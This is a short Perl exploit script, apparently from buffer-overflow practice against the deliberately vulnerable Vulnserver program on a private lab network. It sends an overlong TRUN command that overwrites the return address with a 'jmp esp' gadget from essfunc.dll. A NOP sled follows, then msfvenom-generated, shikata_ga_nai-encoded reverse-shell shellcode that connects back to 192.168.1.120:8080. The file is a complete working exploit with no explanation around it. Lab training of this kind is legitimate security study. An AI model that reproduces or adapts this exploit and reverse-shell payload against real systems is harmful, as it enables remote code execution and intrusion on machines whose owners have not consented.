#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket::INET;

my $host = "192.168.1.121";
my $port = 9999;

my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => 'tcp');
my $payload = "";
$payload .= "A" x 2003;

# 0x625011af : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
$payload .= "\xaf\x11\x50\x62";
$payload .= "\x90" x 16;

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=8080 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f pl
$payload .= 
"\xb8\x4d\x86\x8f\xc1\xda\xcc\xd9\x74\x24\xf4\x5a\x31\xc9" .
"\xb1\x52\x31\x42\x12\x83\xea\xfc\x03\x0f\x88\x6d\x34\x73" .
"\x7c\xf3\xb7\x8b\x7d\x94\x3e\x6e\x4c\x94\x25\xfb\xff\x24" .
"\x2d\xa9\xf3\xcf\x63\x59\x87\xa2\xab\x6e\x20\x08\x8a\x41" .
"\xb1\x21\xee\xc0\x31\x38\x23\x22\x0b\xf3\x36\x23\x4c\xee" .
"\xbb\x71\x05\x64\x69\x65\x22\x30\xb2\x0e\x78\xd4\xb2\xf3" .
"\xc9\xd7\x93\xa2\x42\x8e\x33\x45\x86\xba\x7d\x5d\xcb\x87" .
"\x34\xd6\x3f\x73\xc7\x3e\x0e\x7c\x64\x7f\xbe\x8f\x74\xb8" .
"\x79\x70\x03\xb0\x79\x0d\x14\x07\x03\xc9\x91\x93\xa3\x9a" .
"\x02\x7f\x55\x4e\xd4\xf4\x59\x3b\x92\x52\x7e\xba\x77\xe9" .
"\x7a\x37\x76\x3d\x0b\x03\x5d\x99\x57\xd7\xfc\xb8\x3d\xb6" .
"\x01\xda\x9d\x67\xa4\x91\x30\x73\xd5\xf8\x5c\xb0\xd4\x02" .
"\x9d\xde\x6f\x71\xaf\x41\xc4\x1d\x83\x0a\xc2\xda\xe4\x20" .
"\xb2\x74\x1b\xcb\xc3\x5d\xd8\x9f\x93\xf5\xc9\x9f\x7f\x05" .
"\xf5\x75\x2f\x55\x59\x26\x90\x05\x19\x96\x78\x4f\x96\xc9" .
"\x99\x70\x7c\x62\x33\x8b\x17\x4d\x6c\x92\x9f\x25\x6f\x94" .
"\x40\x26\xe6\x72\x14\x56\xaf\x2d\x81\xcf\xea\xa5\x30\x0f" .
"\x21\xc0\x73\x9b\xc6\x35\x3d\x6c\xa2\x25\xaa\x9c\xf9\x17" .
"\x7d\xa2\xd7\x3f\xe1\x31\xbc\xbf\x6c\x2a\x6b\xe8\x39\x9c" .
"\x62\x7c\xd4\x87\xdc\x62\x25\x51\x26\x26\xf2\xa2\xa9\xa7" .
"\x77\x9e\x8d\xb7\x41\x1f\x8a\xe3\x1d\x76\x44\x5d\xd8\x20" .
"\x26\x37\xb2\x9f\xe0\xdf\x43\xec\x32\x99\x4b\x39\xc5\x45" .
"\xfd\x94\x90\x7a\x32\x71\x15\x03\x2e\xe1\xda\xde\xea\x01" .
"\x39\xca\x06\xaa\xe4\x9f\xaa\xb7\x16\x4a\xe8\xc1\x94\x7e" .
"\x91\x35\x84\x0b\x94\x72\x02\xe0\xe4\xeb\xe7\x06\x5a\x0b" .
"\x22";

$sock->send("TRUN /.:/" . $payload . "\n");
close $sock;
